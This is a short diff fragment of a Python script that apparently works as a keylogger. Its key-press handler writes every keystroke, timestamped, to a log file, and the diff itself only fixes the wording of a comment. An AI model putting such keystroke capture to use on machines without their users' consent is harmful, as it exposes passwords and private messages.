@@ -8,7 +8,7 @@ log_dir = ""
 #FORMATTING
 logging.basicConfig(filename=(log_dir + 'log.txt'), level=logging.DEBUG, format='["%(asctime)s", %(message)s]')
 
-#LOGGING THE WHAT THE LISTENER HEARD
+#LOGGING WHAT THE LISTENER HEARD
 def on_press(key):
     logging.info('"{0}"'.format(key))
     #if key == Key.esc
